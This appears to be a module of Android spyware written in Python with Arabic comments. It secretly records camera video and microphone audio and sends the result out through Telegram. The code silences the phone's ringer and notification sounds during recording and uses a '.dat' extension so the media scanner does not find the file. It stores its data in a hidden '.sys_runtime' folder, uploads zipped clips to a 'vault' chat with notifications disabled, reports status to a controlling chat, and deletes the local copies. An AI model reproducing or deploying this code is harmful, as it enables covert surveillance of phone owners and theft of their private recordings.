# -*- coding: utf-8 -*-
import os
import time
import threading
import zipfile
import logging
import gc
from datetime import datetime

# ========== إعداد المسارات الموحدة ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
T = os.path.join(P, "v_tmp")   # مجلد مؤقت للفيديوهات
for d in [P, T]:
    if not os.path.exists(d):
        os.makedirs(d)

logging.basicConfig(filename=os.path.join(P, "v.log"), level=logging.ERROR, filemode='a')

try:
    from jnius import autoclass, PythonJavaClass, java_method
    JNI = True
except ImportError:
    JNI = False


class StreamManager:
    def __init__(self, tg=None):
        self.tg = tg                     # كائن TelegramUI
        self.recording = False
        self._old_volumes = {}           # حفظ مستويات الصوت القديمة
        self._old_ringer_mode = -1       # حفظ وضع الصامت القديم
        self._status_msg_id = None       # معرف رسالة الحالة
        self._res_map = {
            "144": [256, 144, 150000],
            "360": [640, 360, 800000],
            "720": [1280, 720, 2500000],
            "1080": [1920, 1080, 5000000]
        }

    # ========== كتم صوت قسري (يشمل وضع الصامت وكتم القنوات) ==========
    def _mute_audio(self, mute=True):
        if not JNI:
            return
        try:
            AudioManager = autoclass('android.media.AudioManager')
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            activity = PythonActivity.mActivity
            am = activity.getSystemService(activity.AUDIO_SERVICE)

            if mute:
                # حفظ وضع الصامت القديم
                self._old_ringer_mode = am.getRingerMode()
                am.setRingerMode(AudioManager.RINGER_MODE_SILENT)

                # كتم قنوات الصوت الفردية
                streams = [
                    AudioManager.STREAM_SYSTEM,
                    AudioManager.STREAM_NOTIFICATION,
                    AudioManager.STREAM_ALARM,
                    AudioManager.STREAM_RING
                ]
                for s in streams:
                    try:
                        self._old_volumes[s] = am.getStreamVolume(s)
                        am.setStreamVolume(s, 0, 0)
                    except:
                        pass
            else:
                # استعادة وضع الصامت القديم
                if self._old_ringer_mode != -1:
                    try:
                        am.setRingerMode(self._old_ringer_mode)
                    except:
                        pass
                # استعادة مستويات الصوت لكل قناة
                for s, vol in self._old_volumes.items():
                    try:
                        am.setStreamVolume(s, vol, 0)
                    except:
                        pass
                self._old_volumes.clear()
                self._old_ringer_mode = -1
        except Exception as e:
            logging.error(f"Mute audio error: {e}")

    # ========== التحقق من صحة ملف الفيديو ==========
    def _is_video_valid(self, path, min_duration_ms=500, min_size_bytes=10240):
        if not os.path.exists(path):
            return False
        size = os.path.getsize(path)
        if size < min_size_bytes:
            logging.warning(f"Video too small: {size} bytes")
            return False
        if not JNI:
            return True
        try:
            Retriever = autoclass('android.media.MediaMetadataRetriever')
            retriever = Retriever()
            retriever.setDataSource(path)
            duration_str = retriever.extractMetadata(Retriever.METADATA_KEY_DURATION)
            retriever.release()
            if duration_str:
                duration = int(duration_str)
                if duration >= min_duration_ms:
                    return True
                else:
                    logging.warning(f"Video too short: {duration} ms")
            else:
                logging.warning("Could not extract video duration")
        except Exception as e:
            logging.error(f"Video validation error: {e}")
        return False

    # ========== حذف عادي (بدون الكتابة فوق) – لأن المجلد داخلي وآمن ==========
    def _delete_file(self, path):
        try:
            if os.path.exists(path):
                os.remove(path)
        except Exception as e:
            logging.error(f"Delete error: {e}")

    # ========== إرسال / تحديث رسالة الحالة ==========
    def _send_status_update(self, text, chat_id):
        if not self.tg:
            return None
        try:
            if self._status_msg_id is None:
                resp = self.tg._api("sendMessage", {"chat_id": chat_id, "text": text, "disable_notification": True})
                if resp and resp.get('ok'):
                    self._status_msg_id = resp['result']['message_id']
            else:
                self.tg._api("editMessageText", {"chat_id": chat_id, "message_id": self._status_msg_id, "text": text})
        except Exception as e:
            logging.error(f"Status update error: {e}")

    # ========== بدء التسجيل (الواجهة الخارجية) ==========
    def record(self, mon, cam=0, dur=15):
        if self.recording:
            return
        threading.Thread(target=self._worker, args=(mon, cam, dur), daemon=True).start()

    # ========== معالج التسجيل الأساسي (خيط منفصل) ==========
    def _worker(self, mon, cam_idx, dur):
        self.recording = True
        self._status_msg_id = None

        # إرسال إشعار "جاري التسجيل..."
        self._send_status_update("🎥 جاري التسجيل... ⏳", mon.ctrl)

        # استخدام امتداد مؤقت (.dat) لتجنب كشف ماسح الوسائط
        temp_path = os.path.join(T, f"rec_{int(time.time())}.dat")
        raw_path = temp_path.replace(".dat", ".mp4")
        zipped_path = raw_path + ".zip"

        # إعدادات الجودة
        res_key = getattr(mon, 'video_res', "360")
        w, h, bitrate = self._res_map.get(res_key, self._res_map["360"])

        success = False
        media_recorder = None

        if JNI:
            self._mute_audio(True)
            try:
                MediaRecorder = autoclass('android.media.MediaRecorder')
                media_recorder = MediaRecorder()

                # ضبط مصادر الصوت والفيديو
                media_recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
                media_recorder.setVideoSource(MediaRecorder.VideoSource.CAMERA)

                # تنسيق الإخراج والترميز
                media_recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                media_recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                media_recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)

                # ضبط الدقة ومعدل البت والإطارات
                media_recorder.setVideoSize(w, h)
                media_recorder.setVideoEncodingBitRate(bitrate)
                media_recorder.setVideoFrameRate(30)

                # اتجاه الفيديو (للكاميرا الأمامية والخلفية)
                orientation = 270 if cam_idx == 1 else 90
                media_recorder.setOrientationHint(orientation)

                # ملف الإخراج (بامتداد .dat مؤقتاً)
                media_recorder.setOutputFile(temp_path)

                media_recorder.prepare()
                media_recorder.start()

                # التسجيل للمدة المطلوبة (ننام في أجزاء صغيرة للتحقق من حالة الإيقاف)
                for _ in range(dur):
                    if not self.recording:
                        break
                    time.sleep(1)

                if self.recording:
                    media_recorder.stop()
                    success = True

            except Exception as e:
                logging.error(f"Recording worker error: {e}")
            finally:
                if media_recorder:
                    try:
                        media_recorder.reset()
                        media_recorder.release()
                    except:
                        pass
                self._mute_audio(False)

        # مرحلة ما بعد التسجيل
        if success and self._is_video_valid(temp_path):
            try:
                # إعادة تسمية الملف من .dat إلى .mp4
                if os.path.exists(temp_path):
                    os.rename(temp_path, raw_path)

                # ضغط الفيديو إلى ZIP
                with zipfile.ZipFile(zipped_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                    zf.write(raw_path, os.path.basename(raw_path))

                # إرسال الفيديو إلى قناة الخزنة (vault)
                vault = getattr(mon, 'vlt', None)
                if self.tg and vault:
                    caption = f"🎥 {res_key}p | الكاميرا {cam_idx} | {datetime.now().strftime('%H:%M:%S')}"
                    with open(zipped_path, 'rb') as f:
                        self.tg._api("sendDocument", {
                            "chat_id": vault,
                            "caption": caption,
                            "disable_notification": True
                        }, {"document": f})

                # تحديث رسالة الحالة
                self._send_status_update("✅ تم رفع الفيديو بنجاح", mon.ctrl)

                # حذف الملفات المؤقتة
                self._delete_file(raw_path)
                self._delete_file(zipped_path)

            except Exception as e:
                logging.error(f"Finalization error: {e}")
                self._send_status_update("❌ فشل رفع الفيديو", mon.ctrl)
        else:
            # حذف الملف التالف
            if os.path.exists(temp_path):
                self._delete_file(temp_path)
            self._send_status_update("⚠️ فشل التسجيل (ملف تالف)", mon.ctrl)

        # تنظيف إضافي
        if os.path.exists(temp_path):
            self._delete_file(temp_path)

        self.recording = False
        self._status_msg_id = None
        gc.collect()


def create(tg=None):
    return StreamManager(tg)
